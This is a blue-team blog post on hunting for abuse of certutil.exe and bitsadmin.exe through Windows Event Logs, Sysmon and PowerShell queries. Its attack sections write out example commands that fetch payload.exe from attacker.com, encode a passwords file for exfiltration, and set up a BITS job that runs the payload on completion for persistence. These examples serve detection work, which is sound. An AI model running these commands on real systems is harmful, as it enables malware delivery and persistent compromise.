---
title: "Hunting for LOLBins in Windows Event Logs: certutil & bitsadmin"
date: 2026-03-06
description: "A practical intermediate guide to detecting LOLBin abuse using certutil.exe and bitsadmin.exe through native Windows Event Logs and Sysmon."
tags: ["blueteam", "threat-hunting", "lolbins", "windows", "event-logs", "sysmon", "detection"]
---

## Introduction

Living-off-the-Land Binaries, commonly called **LOLBins**, are legitimate Windows executables that attackers abuse to perform malicious actions while blending in with normal system activity. Because these binaries are signed by Microsoft and present on every Windows installation, they are a favourite tool for red teamers, APT groups, and commodity malware alike.

This post focuses on two of the most abused LOLBins in the wild:

- **certutil.exe** — a certificate utility repurposed for file download and base64 encoding/decoding
- **bitsadmin.exe** — a Background Intelligent Transfer Service tool repurposed for stealthy downloads and persistence

We walk through how attackers use each binary, what traces they leave behind, and how to hunt for that activity using **Windows Event Logs** and **Sysmon**.

{{< callout type="info" >}}
This post covers detection using both native Windows Event Logs and Sysmon. The Sysmon config used is based on the widely adopted SwiftOnSecurity Sysmon config available on GitHub.
{{< /callout >}}

---

## What Are LOLBins and Why Do They Matter?

Traditional antivirus and endpoint tools detect known malicious files: custom malware, unsigned binaries, known bad hashes. LOLBin abuse sidesteps this entirely by using tools that are:

- Already present on every Windows installation
- Digitally signed by Microsoft
- Expected to appear in normal process telemetry
- Whitelisted by many security products by default

This technique is referred to as **"living off the land"**: the attacker brings nothing new to the system, making detection significantly harder. According to the LOLBAS project, there are over 150 documented Windows binaries that can be abused this way.

{{< callout type="warning" >}}
The commands shown in this post are for **educational and detection purposes only**. Do not run these against systems you do not own or have explicit written permission to test.
{{< /callout >}}

---

## Prerequisites — Audit Policy and Sysmon Setup

### Windows Audit Policy

Before hunting, Windows needs to be configured to log the right events. By default many audit categories are disabled.

Open `Local Security Policy` → `Advanced Audit Policy Configuration` and enable:

| Audit Category | Setting | Why |
|---|---|---|
| Process Creation (4688) | Success | Logs every process with full command line |
| Object Access — File System | Success + Failure | Tracks file writes by processes |
| Audit Policy Change | Success | Detects if attacker disables auditing |

Enable command line logging for Event 4688:

```
Computer Configuration → Administrative Templates
→ System → Audit Process Creation
→ "Include command line in process creation events" → Enabled
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

### Sysmon Setup

Sysmon provides far richer telemetry than native audit logs alone. Install it with the SwiftOnSecurity config:

```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "Sysmon.zip"
Expand-Archive Sysmon.zip

# Download SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "sysmonconfig.xml"

# Install
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

Key Sysmon Event IDs we will use in this post:

| Sysmon Event ID | Description |
|---|---|
| 1 | Process Creation (with full command line) |
| 3 | Network Connection |
| 11 | File Created |
| 22 | DNS Query |

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

## certutil.exe

### What It Is

`certutil.exe` is a legitimate Windows command-line utility for managing certificates and certificate authorities. It ships with every version of Windows:

```
C:\Windows\System32\certutil.exe
```

### How Attackers Abuse It

**1. File Download — acting as wget**

```cmd
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Users\Public\payload.exe
```

The `-urlcache` flag fetches a remote file to disk. This has no legitimate administrative use case for downloading executables from the internet.

**2. Base64 Decode — unpacking encoded payloads**

```cmd
certutil.exe -decode encoded_payload.b64 payload.exe
```

Attackers encode malicious payloads in base64 to bypass email filters and AV scanners, then decode them on the target host using certutil.

**3. Base64 Encode — staging for exfiltration**

```cmd
certutil.exe -encode C:\sensitive\passwords.txt C:\Users\Public\out.b64
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

### Hunting certutil — Windows Event Logs

**Event ID 4688 — Process Creation**

Navigate to: `Event Viewer → Windows Logs → Security → Filter → Event ID 4688`

Look for `certutil.exe` in the process name field. Suspicious command line patterns:

| Pattern | Suspicion Level | Reason |
|---|---|---|
| `-urlcache` | 🔴 High | No legitimate use for remote executable fetch |
| `-decode` | 🟠 Medium | Rare in most environments |
| `-encode` | 🟠 Medium | Legitimate but worth baselining |
| `-f http://` or `-f https://` | 🔴 High | Fetching remote resource |
| Output to `\Temp\`, `\Public\`, `\AppData\` | 🔴 High | Common malware staging paths |

PowerShell query to hunt certutil in Security log:

```powershell
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4688 -and
    $_.Message -match "certutil" -and
    $_.Message -match "urlcache|decode|encode"
} | Select-Object TimeCreated, Message | Format-List
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

### Hunting certutil — Sysmon

Sysmon gives you three additional data points that native logs miss entirely.

**Sysmon Event ID 1 — Process Creation**

Navigate to: `Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational`

Filter for Event ID 1 and search for `certutil`. Sysmon Event 1 includes the full command line, parent process, and process hash, making attribution much easier than native 4688.

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

**Sysmon Event ID 3 — Network Connection**

When certutil makes an outbound connection via `-urlcache`, Sysmon logs the destination IP and port:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
    $_.Id -eq 3 -and $_.Message -match "certutil"
} | Select-Object TimeCreated, Message | Format-List
```

Look for: outbound connections from `certutil.exe` to any external IP on port 80 or 443. This should never happen in a clean environment.

**Sysmon Event ID 11 — File Created**

Sysmon logs every file written to disk. Cross-reference certutil process creation (Event 1) timestamps with file creation events (Event 11) in staging directories:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
    $_.Id -eq 11 -and
    $_.Message -match "Public|Temp|AppData"
} | Select-Object TimeCreated, Message | Format-List
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

### certutil Detection Summary

{{< callout type="error" >}}
**High Confidence IOC:** Any instance of `certutil.exe -urlcache -f http` is almost never legitimate and should be treated as an active incident until proven otherwise.
{{< /callout >}}

**Baseline tip:** In some enterprise environments certutil is used legitimately for certificate management. Build a baseline of normal certutil usage (what arguments, which accounts, what times) before tuning alert thresholds.

---

## bitsadmin.exe

### What It Is

`bitsadmin.exe` is a command-line tool for managing Background Intelligent Transfer Service (BITS), a Windows component designed to transfer files in the background, used heavily by Windows Update:

```
C:\Windows\System32\bitsadmin.exe
```

### How Attackers Abuse It

BITS jobs are particularly dangerous because:

- They survive **reboots**, making them a persistence mechanism
- They run as a **Windows service**, blending in with system activity
- They can **execute a command on job completion**, enabling payload execution without spawning an obvious child process
- BITS traffic blends in with **Windows Update traffic** on the network

**1. Download a remote file**

```cmd
bitsadmin /transfer myJob /download /priority normal http://attacker.com/payload.exe C:\Users\Public\payload.exe
```

**2. Persistence via notify command**

```cmd
bitsadmin /create myBackdoor
bitsadmin /addfile myBackdoor http://attacker.com/payload.exe C:\Users\Public\payload.exe
bitsadmin /SetNotifyCmdLine myBackdoor C:\Users\Public\payload.exe NULL
bitsadmin /resume myBackdoor
```

This creates a BITS job that downloads and executes a payload on completion and re-executes on every reboot, a fully functional persistence mechanism using nothing but a built-in Windows tool.

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

### Hunting bitsadmin — Windows Event Logs

**Event ID 4688 — Process Creation**

Filter Security log for Event ID 4688 with process name `bitsadmin.exe`:

| Pattern | Suspicion Level | Reason |
|---|---|---|
| `/transfer` with external URL | 🔴 High | Downloading from internet directly |
| `/SetNotifyCmdLine` | 🔴 High | Execution on completion — persistence |
| `/create` + `/resume` sequence | 🟠 Medium | Job creation chain worth investigating |
| Output to staging directories | 🔴 High | Public, Temp, AppData |

```powershell
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4688 -and
    $_.Message -match "bitsadmin" -and
    $_.Message -match "transfer|SetNotifyCmdLine|create|resume"
} | Select-Object TimeCreated, Message | Format-List
```

**BITS-Client Operational Log**

This dedicated log is often overlooked and contains rich BITS-specific telemetry:

```
Event Viewer → Applications and Services Logs
→ Microsoft → Windows → Bits-Client → Operational
```

| Event ID | Meaning | What to Look For |
|---|---|---|
| 3 | BITS job created | Job name, owner account |
| 4 | BITS job completed | Destination path |
| 59 | Job started transferring | Remote URL |
| 60 | Job stopped transferring | Correlate with Event 59 |

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" | Where-Object {
    $_.Id -in @(3, 4, 59, 60)
} | Select-Object TimeCreated, Id, Message | Format-List
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

### Hunting bitsadmin — Sysmon

**Sysmon Event ID 1 — Process Creation**

Unlike native 4688, Sysmon Event 1 captures the parent process of bitsadmin. A legitimate BITS job is typically spawned by `svchost.exe`. If the parent is `cmd.exe`, `powershell.exe`, or `wscript.exe`, that is a strong indicator of manual attacker activity.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
    $_.Id -eq 1 -and $_.Message -match "bitsadmin"
} | Select-Object TimeCreated, Message | Format-List
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

**Sysmon Event ID 3 — Network Connection**

BITS transfers generate outbound network connections. Sysmon logs the destination:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
    $_.Id -eq 3 -and $_.Message -match "bitsadmin"
} | Select-Object TimeCreated, Message | Format-List
```

Flag any outbound connections from bitsadmin to non-Microsoft IP ranges or unusual domains.

**Sysmon Event ID 22 — DNS Query**

When bitsadmin resolves an attacker-controlled domain, Sysmon logs the DNS query:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
    $_.Id -eq 22 -and $_.Message -match "bitsadmin"
} | Select-Object TimeCreated, Message | Format-List
```

Cross-reference the queried domain against threat intel feeds. Any DNS query originating from bitsadmin to a non-Microsoft domain is suspicious.

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

### bitsadmin Detection Summary

{{< callout type="error" >}}
**High Confidence IOC:** Any BITS job with `/SetNotifyCmdLine` pointing to an executable in a user-writable directory is a persistence mechanism and should be treated as confirmed compromise.
{{< /callout >}}

Check for lingering BITS jobs at any time with:

```cmd
bitsadmin /list /allusers /verbose
```

Any job you cannot attribute to Windows Update, WSUS, or a known application is worth investigating immediately.

---

## Full Hunting Workflow

Use this as a repeatable checklist during investigations or proactive hunts:

``` {linenos=inline}
1. Verify audit policy — confirm 4688 command line logging is enabled
   └── auditpol /get /category:"Detailed Tracking"

2. Hunt certutil in Security log (Event 4688)
   └── Filter: certutil + urlcache|decode|encode

3. Hunt certutil in Sysmon (Event 1, 3, 11)
   └── Event 1: command line + parent process
   └── Event 3: outbound network connections
   └── Event 11: files written to staging directories

4. Hunt bitsadmin in Security log (Event 4688)
   └── Filter: bitsadmin + transfer|SetNotifyCmdLine

5. Hunt bitsadmin in BITS-Client log (Event 59, 60, 3, 4)
   └── Look for external URLs and suspicious job names

6. Hunt bitsadmin in Sysmon (Event 1, 3, 22)
   └── Event 1: parent process — should be svchost not cmd/powershell
   └── Event 3: outbound connections to non-Microsoft IPs
   └── Event 22: DNS queries from bitsadmin process

7. Enumerate active BITS jobs
   └── bitsadmin /list /allusers /verbose

8. Check staging directories for recently created files
   └── C:\Users\Public\, C:\Windows\Temp\, C:\Users\*\AppData\
```

{{< callout type="info" >}}
Screenshot pending — will be added with the next lab run.
{{< /callout >}}

---

## Key Takeaways

- LOLBins are dangerous precisely because they are trusted, detection requires behavioural analysis not just signature matching
- Native Windows Event Logs give you a baseline but **Sysmon fills the critical gaps**: parent process, network connections, DNS queries, and file writes
- The combination of Event 4688 command line + Sysmon Event 1 parent process is your strongest detection primitive for both certutil and bitsadmin
- BITS jobs persist across reboots. Always enumerate active jobs during any investigation
- Build a baseline of legitimate certutil and bitsadmin usage in your environment before tuning alerts, as false positives from Windows Update and certificate management are common

---

## References

- [LOLBAS Project](https://lolbas-project.github.io/) — full catalogue of LOLBins with abuse techniques
- [Sysmon — Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/) — Ingress Tool Transfer
- [MITRE ATT&CK T1197](https://attack.mitre.org/techniques/T1197/) — BITS Jobs
